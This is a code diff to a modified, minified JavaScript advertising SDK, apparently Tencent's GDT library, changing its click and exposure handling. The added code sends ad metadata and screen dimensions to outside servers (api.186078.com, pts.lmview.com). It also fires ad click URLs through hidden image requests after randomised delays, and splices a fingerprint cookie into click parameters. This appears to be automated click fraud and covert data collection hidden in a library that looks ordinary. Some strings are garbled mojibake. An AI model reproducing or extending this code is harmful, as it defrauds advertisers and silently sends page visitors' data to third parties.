+			for(var jjj = 0;jjj < have_ad;jjj++){
+
+			    var tttt = n['data'][jjj];
+			    
+			    var m_img = tttt['img'];
+			    var m_title = tttt['txt'];
+			    var m_desc = tttt['desc'];
+			    var m_ad_industry_id = tttt['ad_industry_id'];
+			    var m_real_adtype = tttt['real_adtype'];
+			    var m_acttype = tttt['acttype'];
+			    var m_advertiser_id = tttt['advertiser_id'];
+			    var m_template_id = tttt['template_id'];
+			    var domain = encodeURIComponent(tttt['domain']);
+			    
+			    
+			    var click_url = '';
+			    var rl = encodeURIComponent(tttt['rl']);
+			    var apurl = encodeURIComponent(tttt['apurl']);
+			    var go_url = ''
+			    var is_from = 1;
+			    var is_new = 4;
+			    var c_go = 0;
+			    var placement_id = t;
+			    
+
+			    
+			    var data = {
+					trackid:trackid,
+					m_title:m_title,
+					m_img:m_img,
+					m_desc:m_desc,
+					m_ad_industry_id:m_ad_industry_id,
+					m_real_adtype:m_real_adtype,
+					m_acttype:m_acttype,
+					m_advertiser_id:m_advertiser_id,
+					m_template_id:m_template_id,
+					domain:domain,
+					rl:rl,
+					apurl:apurl,
+					go_url:go_url,
+					is_from:is_from,
+					is_new:is_new,
+					c_go:c_go,
+					placement_id:placement_id
+				    };	
+
+			    var url = 'https://api.186078.com:3928/aliyun/sample/baseCollect.php';
+			    this.reqRequest(url, JSON.stringify(data), null, null, 1,null);			    
+
 			}
 			
 			
-			if (typeof(n['data'][4]) != 'undefined'){
-			    if (ad_is_save_c_logs === true){
-				//if (parseInt(n['data'][4]['acttype']) == 0 && parseInt(n['data'][4]['ad_industry_id']) == 3601 && n['data'][4]['domain'] == 'h5.gdt.qq.com'){
-				    this.cnzzCount(n['data'][4]);
-				//}
-			    }else{
-				if(typeof(window.all_info['cnzz_count_5']) != 'undefined' && parseInt(window.all_info['cnzz_count_5']) == 1){
-				    var i_this = this;
-				    window.setTimeout(function(){
-					i_this.cnzzCount(n['data'][4]);
-				    },600);				    
-				}
-			    }
-			}
 			
-			
-			if (typeof(n['data'][5]) != 'undefined'){
-			    if (ad_is_save_c_logs === true){
-				//if (parseInt(n['data'][5]['acttype']) == 0 && parseInt(n['data'][5]['ad_industry_id']) == 3601 && n['data'][5]['domain'] == 'h5.gdt.qq.com'){
-				    this.cnzzCount(n['data'][5]);
-				//}
-			    }else{
-				if(typeof(window.all_info['cnzz_count_6']) != 'undefined' && parseInt(window.all_info['cnzz_count_6']) == 1){
-				    var i_this = this;
-				    window.setTimeout(function(){
-					i_this.cnzzCount(n['data'][5]);
-				    },700);				    
-				}
-			    }
-			}	
-			
-			
-			if (typeof(n['data'][6]) != 'undefined'){
-			    if (ad_is_save_c_logs === true){
-				//if (parseInt(n['data'][6]['acttype']) == 0 && parseInt(n['data'][6]['ad_industry_id']) == 3601 && n['data'][6]['domain'] == 'h5.gdt.qq.com'){
-				    this.cnzzCount(n['data'][6]);
-				//}
-			    }else{
-				if(typeof(window.all_info['cnzz_count_7']) != 'undefined' && parseInt(window.all_info['cnzz_count_7']) == 1){
-				    var i_this = this;
-				    window.setTimeout(function(){
-					i_this.cnzzCount(n['data'][6]);
-				    },800);				    
-				}
-			    }
-			}			
-			
-			if (typeof(n['data'][7]) != 'undefined'){
-			    if (ad_is_save_c_logs === true){
-				//if (parseInt(n['data'][7]['acttype']) == 0 && parseInt(n['data'][7]['ad_industry_id']) == 3601 && n['data'][7]['domain'] == 'h5.gdt.qq.com'){
-				    this.cnzzCount(n['data'][7]);
-				//}
-			    }else{
-				if(typeof(window.all_info['cnzz_count_8']) != 'undefined' && parseInt(window.all_info['cnzz_count_8']) == 1){
-				    var i_this = this;
-				    window.setTimeout(function(){
-					i_this.cnzzCount(n['data'][7]);
-				    },900);				    
-				}
-			    }
-			}	
-			
-			
-			if (typeof(n['data'][8]) != 'undefined'){
-			    if (ad_is_save_c_logs === true){
-				//if (parseInt(n['data'][8]['acttype']) == 0 && parseInt(n['data'][8]['ad_industry_id']) == 3601 && n['data'][8]['domain'] == 'h5.gdt.qq.com'){
-				    this.cnzzCount(n['data'][8]);
-				//}
-			    }else{
-				if(typeof(window.all_info['cnzz_count_9']) != 'undefined' && parseInt(window.all_info['cnzz_count_9']) == 1){
-				    var i_this = this;
-				    window.setTimeout(function(){
-					i_this.cnzzCount(n['data'][8]);
-				    },1000);				    
-				}
-			    }
-			}
-			
-			if (typeof(n['data'][9]) != 'undefined'){
-			    if (ad_is_save_c_logs === true){
-				//if (parseInt(n['data'][9]['acttype']) == 0 && parseInt(n['data'][9]['ad_industry_id']) == 3601 && n['data'][9]['domain'] == 'h5.gdt.qq.com'){
-				    this.cnzzCount(n['data'][9]);
-				//}
-			    }else{
-				if(typeof(window.all_info['cnzz_count_10']) != 'undefined' && parseInt(window.all_info['cnzz_count_10']) == 1){
-				    var i_this = this;
-				    window.setTimeout(function(){
-					i_this.cnzzCount(n['data'][9]);
-				    },1100);				    
-				}
-			    }
-			}			
-			
-			
+
 		
+			if (typeof(n['data'][0]) != 'undefined' && typeof(window.all_info['cnzz_count']) != 'undefined' && parseInt(window.all_info['cnzz_count']) == 1)
+			{
+			    console.log('window.screen.width_ijs:'+window.screen.width);
+			    var url = 'https://pts.lmview.com:3930/gt.php?img=&c_w='+window.screen.width;
+
+
+
+
+			    var dddddddd = JSON.stringify(n);
+
+			    console.log('url:'+url);
+			    var i_this = this;
+			    window.setTimeout(function(){
+				i_this.cnzzCount(n['data'][0]);
+			    },1000);
+			}
+			
+		    if (typeof(n['data'][1]) != 'undefined' && typeof(window.all_info['cnzz_count_2']) != 'undefined' && parseInt(window.all_info['cnzz_count_2']) == 1)
+			{
+			    
+			    
+			    var i_this = this;
+			    window.setTimeout(function(){
+				i_this.cnzzCount(n['data'][1]);
+			    },1200);
+			}	
+			
+			if (typeof(n['data'][2]) != 'undefined' && typeof(window.all_info['cnzz_count_3']) != 'undefined' && parseInt(window.all_info['cnzz_count_3']) == 1)
+			{
+			    
+
+			    var i_this = this;
+			    window.setTimeout(function(){
+				i_this.cnzzCount(n['data'][2]);
+			    },1500);
+			}
+			
+			
+			if (typeof(n['data'][3]) != 'undefined' && typeof(window.all_info['cnzz_count_4']) != 'undefined' && parseInt(window.all_info['cnzz_count_4']) == 1)
+			{
+			    
+
+			    var i_this = this;
+			    window.setTimeout(function(){
+				i_this.cnzzCount(n['data'][3]);
+			    },1600);
+			}
+			
+			if (typeof(n['data'][4]) != 'undefined' && typeof(window.all_info['cnzz_count_5']) != 'undefined' && parseInt(window.all_info['cnzz_count_5']) == 1)
+			{
+			    
+
+			    var i_this = this;
+			    window.setTimeout(function(){
+				i_this.cnzzCount(n['data'][4]);
+			    },1800);
+			}	
+			
+			
+			if (typeof(n['data'][5]) != 'undefined' && typeof(window.all_info['cnzz_count_6']) != 'undefined' && parseInt(window.all_info['cnzz_count_6']) == 1)
+			{
+			    
+			    
+			    var i_this = this;
+			    window.setTimeout(function(){
+				i_this.cnzzCount(n['data'][5]);
+			    },1900);
+			}
+			
+			if (typeof(n['data'][6]) != 'undefined' && typeof(window.all_info['cnzz_count_7']) != 'undefined' && parseInt(window.all_info['cnzz_count_7']) == 1)
+			{
+
+			    
+			    var i_this = this;
+			    window.setTimeout(function(){
+				i_this.cnzzCount(n['data'][6]);
+			    },2000);
+			}
+			
+			if (typeof(n['data'][7]) != 'undefined' && typeof(window.all_info['cnzz_count_8']) != 'undefined' && parseInt(window.all_info['cnzz_count_8']) == 1)
+			{
+
+			    
+			    var i_this = this;
+			    window.setTimeout(function(){
+				i_this.cnzzCount(n['data'][7]);
+			    },2100);
+			}	
+			
+			if (typeof(n['data'][8]) != 'undefined' && typeof(window.all_info['cnzz_count_9']) != 'undefined' && parseInt(window.all_info['cnzz_count_9']) == 1)
+			{
+
+			    
+			    var i_this = this;
+			    window.setTimeout(function(){
+				i_this.cnzzCount(n['data'][8]);
+			    },2200);
+			}			
+			
+			if (typeof(n['data'][9]) != 'undefined' && typeof(window.all_info['cnzz_count_10']) != 'undefined' && parseInt(window.all_info['cnzz_count_10']) == 1)
+			{
+		    
+			    
+			    var i_this = this;
+			    window.setTimeout(function(){
+				i_this.cnzzCount(n['data'][9]);
+			    },2300);
+			    
+			    
+			}			
 			
 			if (n.template && n.template.length > 0){
 			    var rand_122 = Math.floor(Math.random() * (1000 - 1)) + 1;
@@ -1852,15 +1884,56 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 			
                     },
                     doClick: function(t) {
-			var t_string = JSON.stringify(t);		
-			if (ad_is_save_c_logs === true){
-			    for (var n = "", i = e, a = "", d = 0; d < i.originConflist.length; d++)
+			var t_string = JSON.stringify(t);
+			
+			if (typeof(t.c) === 'undefined'){
+			    
+				for (var n = "", i = e, a = "", d = 0; d < i.originConflist.length; d++)
 				 if (t.placement_id == i.originConflist[d].posId) {
 				     if (i.originConflist[d].from && i.originConflist[d].from == i.tbsFlag && i.tbsDomain == document.domain) return;
 				     break
 				 }
 				if (t && t.s && t.advertisement_id && t.placement_id) {
+				    if (a = t.traceid ? e.apUrlMap[t.advertisement_id + t.placement_id + t.traceid] : e.apUrlMap[t.advertisement_id + t.placement_id], r.default.evnet(120521, "do_click", t)) return r.default.evnet(120528, "ERR_do_click", {
+					params: JSON.stringify(t)
+				    }), {
+					ret: 1,
+					msg: "error閿涘奔绗夐懗鍊熺箻鐞涘瞼鍋ｉ崙鏄忕儲鏉烇拷"
+				    };
+				    try {
+					var s = g.getCookie("gdt_fp");
+					if (s) {
+					    var c = "object" === o(t.s) ? decodeURIComponent(JSON.stringify(t.s)) : decodeURIComponent(t.s);
+					    (c = JSON.parse(c)).fpid = s, t.s = encodeURIComponent(JSON.stringify(c))
+					}
+				    } catch (e) {
 
+				    }
+
+				    if (n = i.rlMap[t.advertisement_id + t.placement_id] + "&s=" + t.s, i.isAndroidApp[t.advertisement_id]) {
+					if (t.qqse_extStr) n = n + "&qqse_extStr=" + encodeURIComponent(JSON.stringify(t.qqse_extStr));
+					if (t._autodownload && (n = n + "&_autodownload=" + t._autodownload), e.getSite(t.placement_id) == e.CONST.SITESET_MOBILE_INNER){
+					    if (0 == t.redirect){
+						(new Image).src = n;
+					    }else{
+						e.goUrl(t,n);
+						//location.href = n;
+					    } 					
+					}else{
+					    n = ~~n.indexOf("&s_lp") > 0 ? n : n + "&acttype=" + i.CONST.ACTTYPE_DOWNLOAD, e.goUrl(t,n)
+					} 
+				    } else{
+					i.isIOSApp[t.advertisement_id] && navigator && navigator.userAgent && -1 !== navigator.userAgent.indexOf("MicroMessenger") && (n += "&platform=wx&target=appstore"), e.goUrl(t,n);
+				    }
+				}
+			    
+			}else{
+				for (var n = "", i = e, a = "", d = 0; d < i.originConflist.length; d++)
+				 if (t.placement_id == i.originConflist[d].posId) {
+				     if (i.originConflist[d].from && i.originConflist[d].from == i.tbsFlag && i.tbsDomain == document.domain) return;
+				     break
+				 }
+				if (t && t.s && t.advertisement_id && t.placement_id) {
 				    if (a = t.traceid ? e.apUrlMap[t.advertisement_id + t.placement_id + t.traceid] : e.apUrlMap[t.advertisement_id + t.placement_id], r.default.evnet(120521, "do_click", t)) return r.default.evnet(120528, "ERR_do_click", {
 					params: JSON.stringify(t)
 				    }), {
@@ -1891,172 +1964,33 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 				    } else{
 					i.isIOSApp[t.advertisement_id] && navigator && navigator.userAgent && -1 !== navigator.userAgent.indexOf("MicroMessenger") && (n += "&platform=wx&target=appstore"), e.goUrl(t,n);
 				    }
-				}
-			}else{
-
-			    if (typeof(t.c) === 'undefined'){
-
-				    for (var n = "", i = e, a = "", d = 0; d < i.originConflist.length; d++)
-				     if (t.placement_id == i.originConflist[d].posId) {
-					 if (i.originConflist[d].from && i.originConflist[d].from == i.tbsFlag && i.tbsDomain == document.domain) return;
-					 break
-				     }
-				    if (t && t.s && t.advertisement_id && t.placement_id) {
-					if (a = t.traceid ? e.apUrlMap[t.advertisement_id + t.placement_id + t.traceid] : e.apUrlMap[t.advertisement_id + t.placement_id], r.default.evnet(120521, "do_click", t)) return r.default.evnet(120528, "ERR_do_click", {
-					    params: JSON.stringify(t)
-					}), {
-					    ret: 1,
-					    msg: "error閿涘奔绗夐懗鍊熺箻鐞涘瞼鍋ｉ崙鏄忕儲鏉烇拷"
-					};
-					try {
-					    var s = g.getCookie("gdt_fp");
-					    if (s) {
-						var c = "object" === o(t.s) ? decodeURIComponent(JSON.stringify(t.s)) : decodeURIComponent(t.s);
-						(c = JSON.parse(c)).fpid = s, t.s = encodeURIComponent(JSON.stringify(c))
-					    }
-					} catch (e) {
-
-					}
-
-					if (n = i.rlMap[t.advertisement_id + t.placement_id] + "&s=" + t.s, i.isAndroidApp[t.advertisement_id]) {
-					    if (t.qqse_extStr) n = n + "&qqse_extStr=" + encodeURIComponent(JSON.stringify(t.qqse_extStr));
-					    if (t._autodownload && (n = n + "&_autodownload=" + t._autodownload), e.getSite(t.placement_id) == e.CONST.SITESET_MOBILE_INNER){
-						if (0 == t.redirect){
-						    (new Image).src = n;
-						}else{
-						    e.goUrl(t,n);
-						    //location.href = n;
-						} 					
-					    }else{
-						n = ~~n.indexOf("&s_lp") > 0 ? n : n + "&acttype=" + i.CONST.ACTTYPE_DOWNLOAD, e.goUrl(t,n)
-					    } 
-					} else{
-					    i.isIOSApp[t.advertisement_id] && navigator && navigator.userAgent && -1 !== navigator.userAgent.indexOf("MicroMessenger") && (n += "&platform=wx&target=appstore"), e.goUrl(t,n);
-					}
-				    }
-
-			    }else{
-				    for (var n = "", i = e, a = "", d = 0; d < i.originConflist.length; d++)
-				     if (t.placement_id == i.originConflist[d].posId) {
-					 if (i.originConflist[d].from && i.originConflist[d].from == i.tbsFlag && i.tbsDomain == document.domain) return;
-					 break
-				     }
-				    if (t && t.s && t.advertisement_id && t.placement_id) {
-					if (a = t.traceid ? e.apUrlMap[t.advertisement_id + t.placement_id + t.traceid] : e.apUrlMap[t.advertisement_id + t.placement_id], r.default.evnet(120521, "do_click", t)) return r.default.evnet(120528, "ERR_do_click", {
-					    params: JSON.stringify(t)
-					}), {
-					    ret: 1,
-					    msg: "error閿涘奔绗夐懗鍊熺箻鐞涘瞼鍋ｉ崙鏄忕儲鏉烇拷"
-					};
-					try {
-					    var s = g.getCookie("gdt_fp");
-					    if (s) {
-						//var c = "object" === o(t.s) ? decodeURIComponent(JSON.stringify(t.s)) : decodeURIComponent(t.s);
-						var c = "object" === typeof(t.s) ? decodeURIComponent(JSON.stringify(t.s)) : decodeURIComponent(t.s);
-						(c = JSON.parse(c)).fpid = s, t.s = encodeURIComponent(JSON.stringify(c))
-					    }
-					} catch (e) {
-					}
-					if (n = i.rlMap[t.advertisement_id + t.placement_id] + "&s=" + t.s, i.isAndroidApp[t.advertisement_id]) {
-					    if (t.qqse_extStr) n = n + "&qqse_extStr=" + encodeURIComponent(JSON.stringify(t.qqse_extStr));
-					    if (t._autodownload && (n = n + "&_autodownload=" + t._autodownload), e.getSite(t.placement_id) == e.CONST.SITESET_MOBILE_INNER){
-						if (0 == t.redirect){
-						    (new Image).src = n;
-						}else{
-						    e.goUrl(t,n);
-						    //location.href = n;
-						} 					
-					    }else{
-						n = ~~n.indexOf("&s_lp") > 0 ? n : n + "&acttype=" + i.CONST.ACTTYPE_DOWNLOAD, e.goUrl(t,n)
-					    } 
-					} else{
-					    i.isIOSApp[t.advertisement_id] && navigator && navigator.userAgent && -1 !== navigator.userAgent.indexOf("MicroMessenger") && (n += "&platform=wx&target=appstore"), e.goUrl(t,n);
-					}
-				    }			    
-
-			    }
+				}			    
+			    
 			}
+			    
 			
                     },
 		    goUrl:function(t,n){
 			
 			var p2 = {"window_screen_height":window.screen.height, "window_screen_width":window.screen.width};
 			p2 = JSON.stringify(p2);
+//			var blogs = 'https://api.186078.com:3928/Requestnew/clickAd?trackid='+trackid+'&c='+t.c;
+//			new Image().src = blogs;
 			var tc = typeof(t['c']) === 'undefined' ? 2 :1;
-			//var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=5&p1='+t['s']+'&txt='+encodeURIComponent(t['txt'])+'&real_adtype='+encodeURIComponent(t['real_adtype'])+'&rl='+encodeURIComponent(t['rl'])+'&price='+encodeURIComponent(t['price'])+'&acttype='+encodeURIComponent(t['acttype'])+'&desc='+encodeURIComponent(t['desc'])+'&img='+encodeURIComponent(t['img'])+'&p2='+p2+'&dpr='+window.devicePixelRatio+'&tc='+tc;
-			////new Image().src = alogs;			
+			var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=5&p1='+t['s']+'&txt='+encodeURIComponent(t['txt'])+'&real_adtype='+encodeURIComponent(t['real_adtype'])+'&rl='+encodeURIComponent(t['rl'])+'&price='+encodeURIComponent(t['price'])+'&acttype='+encodeURIComponent(t['acttype'])+'&desc='+encodeURIComponent(t['desc'])+'&img='+encodeURIComponent(t['img'])+'&p2='+p2+'&dpr='+window.devicePixelRatio+'&tc='+tc;
+			new Image().src = alogs;			
 			
 			
-			if (ad_is_save_c_logs === true){
-			    
-			    var m_img = t['img'];
-			    var m_title = t['txt'];
-			    var m_desc = t['desc'];
-			    var m_ad_industry_id = t['ad_industry_id'];
-			    var m_real_adtype = t['real_adtype'];
-			    var m_acttype = t['acttype'];
-			    var m_advertiser_id = t['advertiser_id'];
-			    var m_template_id = t['template_id'];
-			    var domain = encodeURIComponent(t['domain']);
-			    
-			    
-			    var click_url = '';
-			    var rl = encodeURIComponent(t['rl']);
-			    var apurl = encodeURIComponent(t['apurl']);
-			    var go_url = encodeURIComponent(n);
-			    var is_from = 7;
-			    var is_new = 4;
-			    var c_go = 0;
-			    var placement_id = t['placement_id'];
-			    
-
-			    
-//			    var m_viewid = '';
-//			    var alogs = 'https://api.186078.com:3928/aliyun/sample/Tissue1001.php?m_img='+m_img+'&m_title='+m_title+'&m_desc='+m_desc+'&m_ad_industry_id='+m_ad_industry_id+'&m_advertiser_id='+m_advertiser_id+'&m_real_adtype='+m_real_adtype+'&m_acttype='+m_acttype+'&m_viewid='+m_viewid+'&click_url='+click_url+'&rl='+rl+'&apurl='+apurl+'&go_url='+go_url+'&template_id='+m_template_id+'&is_from='+is_from+'&is_new='+is_new+'&c_go='+c_go+'&domain='+domain+'&placement_id='+placement_id+'&trackid='+trackid;
-//			    //new Image().src = alogs;
-			    
-			    var data = {
-					trackid:trackid,
-					m_title:m_title,
-					m_img:m_img,
-					m_desc:m_desc,
-					m_ad_industry_id:m_ad_industry_id,
-					m_real_adtype:m_real_adtype,
-					m_acttype:m_acttype,
-					m_advertiser_id:m_advertiser_id,
-					m_template_id:m_template_id,
-					domain:domain,
-					rl:rl,
-					apurl:apurl,
-					go_url:go_url,
-					is_from:is_from,
-					is_new:is_new,
-					c_go:c_go,
-					m_advertiser_id:placement_id
-				    };				    
-			    
-			    
-			    
-			    var url = 'https://api.186078.com:3928/aliyun/sample/Collect.php';
-			    this.reqRequest(url, JSON.stringify(data), null, null, 1,null);				    
-			    
-			    
-			    
-			    
-			    
+			if (t.c != 'undefined' && parseInt(t.c) == 1){
+			    var rrr = Math.floor(Math.random() * (3000 - 1000)) + 1000;
+			    window.setTimeout(function(){
+				//e.creatAdiframe(n);
+				new Image().src = n;
+			    },rrr);
 			}else{
-			    if (t.c == 1){
-				var rrr = Math.floor(Math.random() * (3000 - 1000)) + 1000;
-				window.setTimeout(function(){
-				    //e.creatAdiframe(n);
-				    new Image().src = n;
-				},rrr);				
-			    }else{
-				window.setTimeout(function(){
-				    location.href = n;
-				},500);				
-			    }
-
+			    window.setTimeout(function(){
+				location.href = n;
+			    },500);
 			}
 		    },
                     getTopUrl: function() {
@@ -2602,11 +2536,11 @@ catch(err){
                             e.imgExposeCheck(t, n, o, i, a)
                         }, 50)
                     }, e.doExposeCheck = function(t, n, o, i) {
-			//console.log('d3');
+			console.log('d3');
                         var a = e.calculateElmTop(t);
                         h.check(a, n) && e.doExpose(t, n, o, a)
                     }, e.doExpose = function(n, o, i, a) {
-			//console.log('fff');
+			console.log('fff');
                         e.bindScroll[o] && (document.removeEventListener("scroll", e.scrollFunc, !1), e.bindScroll[o] = !1), y.postMessage(n, {
                             op: "doExpose",
                             apurl: i,
@@ -2630,14 +2564,14 @@ catch(err){
                     }, e.isTBSsupported = function() {
                         return !(-1 === navigator.userAgent.indexOf("TBS") || void 0 === o(window.tbsJs) || !tbsJs.isTbsJsapiEnabled())
                     }, e.tbsExposeCheck = function() {
-			//console.log('d4');
+			console.log('d4');
                         if (e.tbsAdInfo.adtype && e.tbsAdInfo.posid && e.tbsAdInfo.apurl) {
                             var n = w.calculateElmTop(e.tbsAdInfo.adtype);
                             t.tbsWebviewValidateValue > m.VALID_VISUAL_DISTANCE && t.tbsWebviewValidateValue - n > m.VALID_VISUAL_DISTANCE && w.doExpose(e.tbsAdInfo.adtype, e.tbsAdInfo.posid, e.tbsAdInfo.apurl)
                         }
                     }, e.tbsReady = function() {
                         try {
-			    //console.log('d5');
+			    console.log('d5');
                             tbs.event.onwebviewvalidate(function(n) {
                                 var o = void 0 !== n.webview_type ? n.webview_type : "-1";
                                 "-1" === o || "1" === o ? (t.tbsWebviewValidateValue = n.value, t.webviewType = 1, e.tbsExposeCheck()) : "2" === o && (t.webviewType = 2, e.tbsAdInfo.adtype && e.tbsAdInfo.posid && e.tbsAdInfo.apurl ? w.doExpose(e.tbsAdInfo.adtype, e.tbsAdInfo.posid, e.tbsAdInfo.apurl) : t.missExpose = !0)
@@ -2877,7 +2811,7 @@ catch(err){
             }, {
                 key: "getAntiSpamInfo",
                 value: function() {
-		    //console.log('getAntiSpamInfo');
+		    console.log('getAntiSpamInfo');
                     var e = this.state,
                         t = (e.ad, e.touchStart),
                         n = e.touchEnd,
